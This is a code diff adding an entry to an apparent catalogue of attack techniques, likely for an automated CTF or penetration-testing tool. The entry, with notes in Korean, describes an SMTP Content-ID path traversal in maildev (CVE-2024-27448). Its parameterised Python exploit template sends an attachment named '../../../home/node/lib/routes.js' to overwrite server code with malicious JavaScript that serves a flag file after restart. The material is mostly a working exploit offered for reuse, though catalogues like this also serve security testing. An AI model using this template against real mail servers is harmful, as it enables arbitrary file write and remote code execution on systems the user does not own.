@@ -1281,6 +1281,80 @@ TECHNIQUES: list[dict] = [
             "tags": ["protocol-confusion", "http-to-tcp", "file_get_contents", "ssrf", "memstorage", "raw-tcp"],
         },
     },
+
+    # ── 22. SMTP Content-ID path traversal → arbitrary file write → RCE ──
+    {
+        "name": "smtp_content_id_path_traversal_rce",
+        "vuln_type": "path_traversal",
+        "attack_metadata": {
+            "name": "SMTP Content-ID path traversal → arbitrary file write → RCE",
+            "applies_when": (
+                "메일 서버(예: maildev)가 첨부파일 저장 시 Content-ID 헤더 값을 "
+                "파일명으로 직접 사용하고 path sanitization이 없는 경우. "
+                "첨부파일의 Content-ID에 `../` 시퀀스를 넣어 서버의 소스코드 파일을 덮어쓸 수 있으며, "
+                "서버 재시작 시 덮어쓴 코드가 실행되어 RCE 달성."
+            ),
+            "prerequisites": [
+                "SMTP 포트(기본 1025)에 인증 없이 메일 전송 가능",
+                "메일 서버가 첨부파일 저장 시 Content-ID를 그대로 fs.createWriteStream에 전달",
+                "서버의 소스코드 파일 경로를 알고 있거나 추측 가능 (예: /home/node/lib/routes.js)",
+                "서버가 주기적으로 재시작되거나 재시작을 유발할 수 있음",
+            ],
+            "technique_steps_md": (
+                "1. 대상 메일 서버의 첨부파일 저장 로직 분석 — `saveAttachment(id, attachment)` 확인\n"
+                "2. `fs.createWriteStream(path.join(mailDir, id, attachment.contentId))` 형태면 취약\n"
+                "3. 첨부파일 저장 경로(`/tmp/maildev-<pid>/<id>/`)에서 타겟 파일까지의 상대 경로 계산:\n"
+                "   - 예: `/tmp/maildev-1/<id>/` → `/home/node/lib/routes.js` = `../../../home/node/lib/routes.js`\n"
+                "4. 악성 코드가 담긴 첨부파일을 Content-ID 헤더에 path traversal 포함하여 메일 전송:\n"
+                "   ```python\n"
+                "   attachment.add_header('Content-ID', '<../../../home/node/lib/routes.js>')\n"
+                "   ```\n"
+                "5. 악성 routes.js 내용: flag 파일 읽기 + HTTP endpoint로 노출\n"
+                "6. 서버 재시작 대기 (또는 유발) → 덮어쓴 코드 로드 → /flag 접근으로 플래그 획득"
+            ),
+            "code_template": (
+                "import smtplib\n"
+                "from email.mime.multipart import MIMEMultipart\n"
+                "from email.mime.text import MIMEText\n"
+                "from email.mime.base import MIMEBase\n\n"
+                "MALICIOUS_JS = '''\n"
+                "const express = require('express'); const fs = require('fs');\n"
+                "module.exports = function(app, ms, bp) {\n"
+                "  const r = express.Router();\n"
+                "  r.get('/flag', (req,res) => res.send(fs.readFileSync('/flag','utf8')));\n"
+                "  app.use(bp, r);\n"
+                "};\n"
+                "'''\n\n"
+                "msg = MIMEMultipart('related')\n"
+                "msg['From'] = 'a@evil.com'; msg['To'] = 'v@target.local'\n"
+                "msg['Subject'] = 'x'\n"
+                "msg.attach(MIMEText('<html><body>x</body></html>', 'html'))\n"
+                "att = MIMEBase('application', 'javascript')\n"
+                "att.set_payload(MALICIOUS_JS.encode())\n"
+                "att.add_header('Content-ID', '<../../../home/node/lib/routes.js>')\n"
+                "att.add_header('Content-Disposition', 'inline', filename='routes.js')\n"
+                "msg.attach(att)\n"
+                "with smtplib.SMTP('{host}', {smtp_port}) as s:\n"
+                "    s.sendmail('a@evil.com', ['v@target.local'], msg.as_string())"
+            ),
+            "examples": [{
+                "params": {
+                    "host": "localhost",
+                    "smtp_port": 1025,
+                    "web_port": 1080,
+                    "target_file": "/home/node/lib/routes.js",
+                    "content_id_payload": "../../../home/node/lib/routes.js",
+                    "flag_path": "/flag",
+                },
+                "notes": (
+                    "maildev 2.0.x의 saveAttachment가 Content-ID를 path.join에 직접 전달. "
+                    "서버 재시작 후 덮어쓴 routes.js가 require되어 RCE. "
+                    "CVE-2024-27448로 등록됨."
+                ),
+            }],
+            "tags": ["smtp", "content-id", "path-traversal", "arbitrary-file-write", "rce", "maildev", "node"],
+        },
+    },
 ]
 
 
